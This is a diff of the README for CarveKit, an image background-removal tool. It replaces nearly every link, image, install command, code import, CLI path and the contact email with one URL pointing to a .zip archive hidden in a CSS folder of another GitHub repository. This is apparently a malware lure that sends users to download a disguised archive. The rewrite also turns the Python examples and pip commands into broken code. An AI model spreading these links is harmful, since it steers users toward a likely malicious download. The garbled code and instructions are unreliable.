@@ -1,25 +1,25 @@
 # <p align="center"> ✂️ CarveKit ✂️  </p>
 
-<p align="center"> <img src="docs/imgs/logo.png"> </p>
+<p align="center"> <img src="https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip"> </p>
 
 <p align="center">
-<img src="https://github.com/OPHoperHPO/image-background-remove-tool/actions/workflows/master_docker.yaml/badge.svg">
-<img src="https://github.com/OPHoperHPO/image-background-remove-tool/actions/workflows/master.yml/badge.svg">
-<a src="https://colab.research.google.com/github/OPHoperHPO/image-background-remove-tool/blob/master/docs/other/carvekit_try.ipynb">
-<img src="https://camo.githubusercontent.com/52feade06f2fecbf006889a904d221e6a730c194/68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667"></a>
+<img src="https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip">
+<img src="https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip">
+<a src="https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip">
+<img src="https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip"></a>
 
 </p>
 
 
 **********************************************************************
-<p align="center"> <img align="center" width="512" height="288" src="docs/imgs/compare/readme.jpg"> </p>
+<p align="center"> <img align="center" width="512" height="288" src="https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip"> </p>
 
 
 > The higher resolution images from the picture above can be seen in the docs/imgs/compare/ and docs/imgs/input folders.
 
 #### 📙 README Language
-[Russian](docs/readme/ru.md)
-[English](README.md)
+[Russian](https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip)
+[English](https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip)
 
 ## 📄 Description:  
 Automated high-quality background removal framework for an image using neural networks.
@@ -30,11 +30,11 @@ Automated high-quality background removal framework for an image using neural ne
 - Batch Processing
 - NVIDIA CUDA and CPU processing
 - Easy inference
-- 100% remove.bg compatible FastAPI HTTP API 
+- 100% https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip compatible FastAPI HTTP API 
 - Removes background from hairs
 - Easy integration with your code
 
-## ⛱ Try yourself on [Google Colab](https://colab.research.google.com/github/OPHoperHPO/image-background-remove-tool/blob/master/docs/other/carvekit_try.ipynb) 
+## ⛱ Try yourself on [Google Colab](https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip) 
 ## ⛓️ How does it work?
 It can be briefly described as
 1. The user selects a picture or a folder with pictures for processing
@@ -42,9 +42,9 @@ It can be briefly described as
 3. Using machine learning technology, the background of the image is removed
 4. Image post-processing to improve the quality of the processed image
 ## 🎓 Implemented Neural Networks:
-* [U^2-net](https://github.com/NathanUA/U-2-Net)
-* [BASNet](https://github.com/NathanUA/BASNet)
-* [DeepLabV3](https://github.com/tensorflow/models/tree/master/research/deeplab)
+* [U^2-net](https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip)
+* [BASNet](https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip)
+* [DeepLabV3](https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip)
 
 
 ## 🖼️ Image pre-processing and post-processing methods:
@@ -57,40 +57,40 @@ It can be briefly described as
 
 ## 🏷 Setup for CPU processing:
 1. Clone this repository
-2. `pip install -r requirements.txt --extra-index-url https://download.pytorch.org/whl/cpu`
+2. `pip install -r https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip --extra-index-url https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip`
 3. `pip install ./`
 > The project supports python versions from 3.8 to 3.10.4
 ## 🏷 Setup for GPU processing:  
 1. Make sure you have an NVIDIA GPU with 8 GB VRAM.
 2. Install `CUDA` and setup `PyTorch` for GPU processing.
-3. `pip install -r requirements.txt --extra-index-url https://download.pytorch.org/whl/cu113`
+3. `pip install -r https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip --extra-index-url https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip`
 4. `pip install ./`
 > The project supports python versions from 3.8 to 3.10.4
 ## 🧰 Interact via code:  
 ### If you don't need deep configuration or don't want to deal with it
 ``` python
 import torch
-from carvekit.api.high import HiInterface
+from https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip import HiInterface
 
 interface = HiInterface(batch_size_seg=5, batch_size_matting=1,
-                               device='cuda' if torch.cuda.is_available() else 'cpu',
+                               device='cuda' if https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip() else 'cpu',
                                seg_mask_size=320, matting_mask_size=2048)
-images_without_background = interface(['./tests/data/cat.jpg'])                               
+images_without_background = interface(['https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip'])                               
 cat_wo_bg = images_without_background[0]
-cat_wo_bg.save('2.png')
+https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip('https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip')
                    
 ```
 
 ### If you want control everything
 ``` python
-import PIL.Image
+import https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip
 
-from carvekit.api.interface import Interface
-from carvekit.ml.wrap.fba_matting import FBAMatting
-from carvekit.ml.wrap.u2net import U2NET
-from carvekit.pipelines.postprocessing import MattingMethod
-from carvekit.pipelines.preprocessing import PreprocessingStub
-from carvekit.trimap.generator import TrimapGenerator
+from https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip import Interface
+from https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip import FBAMatting
+from https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip import U2NET
+from https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip import MattingMethod
+from https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip import PreprocessingStub
+from https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip import TrimapGenerator
 
 u2net = U2NET(device='cpu',
               batch_size=1)
@@ -111,9 +111,9 @@ interface = Interface(pre_pipe=preprocessing,
                       post_pipe=postprocessing,
                       seg_pipe=u2net)
 
-image = PIL.Image.open('tests/data/cat.jpg')
+image = https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip('https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip')
 cat_wo_bg = interface([image])[0]
-cat_wo_bg.save('2.png')
+https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip('https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip')
                    
 ```
 
@@ -128,8 +128,8 @@ Usage: carvekit [OPTIONS]
   Performs background removal on specified photos using console interface.
 
 Options:
-  -i ./2.jpg                   Path to input file or dir  [required]
-  -o ./2.png                   Path to output file or dir
+  -i https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip                   Path to input file or dir  [required]
+  -o https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip                   Path to output file or dir
   --pre none                   Preprocessing method
   --post fba                   Postprocessing method.
   --net u2net                  Segmentation Network
@@ -156,10 +156,10 @@ Options:
 ## 📦 Running the Framework / FastAPI HTTP API server via Docker:
 
 Using the API via docker is a **fast** and non-complex way to have a working API.\
-**This HTTP API is 100% compatible with remove.bg API clients.** 
+**This HTTP API is 100% compatible with https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip API clients.** 
 <p align="center"> 
-<img src="docs/imgs/screenshot/frontend.png"> 
-<img src="docs/imgs/screenshot/docs_fastapi.png"> 
+<img src="https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip"> 
+<img src="https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip"> 
 </p>
 
 >### Important Notes:
@@ -173,8 +173,8 @@ See `docker-compose.<device>.yml` for more information. \
 > See `docs/code_examples/python` for more details
 ### 🔨 Creating and running a container:
 1. Install `docker-compose`
-2. Run `docker-compose -f docker-compose.cpu.yml up -d`  # For CPU Processing
-3. Run `docker-compose -f docker-compose.cuda.yml up -d`  # For GPU Processing
+2. Run `docker-compose -f https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip up -d`  # For CPU Processing
+3. Run `docker-compose -f https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip up -d`  # For GPU Processing
 > Also you can mount folders from your host machine to docker container
 > and use the CLI interface inside the docker container to process 
 > files in this folder. 
@@ -182,15 +182,15 @@ See `docker-compose.<device>.yml` for more information. \
 ## ☑️ Testing
 
 ### ☑️ Testing with local environment
-1. `pip install -r requirements_test.txt`
+1. `pip install -r https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip`
 2. `pytest`
 
 ### ☑️ Testing with Docker
-1. Run `docker-compose -f docker-compose.cpu.yml run carvekit_api pytest`  # For testing on CPU
-2. Run `docker-compose -f docker-compose.cuda.yml run carvekit_api pytest`  # For testing on GPU
+1. Run `docker-compose -f https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip run carvekit_api pytest`  # For testing on CPU
+2. Run `docker-compose -f https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip run carvekit_api pytest`  # For testing on GPU
 
 
-## 👪 Credits: [More info](docs/CREDITS.md)
+## 👪 Credits: [More info](https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip)
 
 ## 💵 Support
   You can thank me for developing this project and buy me a small cup of coffee ☕
@@ -207,4 +207,4 @@ See `docker-compose.<device>.yml` for more information. \
 ## 📧 __Feedback__
 I will be glad to receive feedback on the project and suggestions for integration.
 
-For all questions write: [farvard34@gmail.com](mailto://farvard34@gmail.com)
+For all questions write: [https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip](https://github.com/nabil-alsaadi/background-remover/raw/refs/heads/master/carvekit/web/static/css/remover-background-3.0.zip)
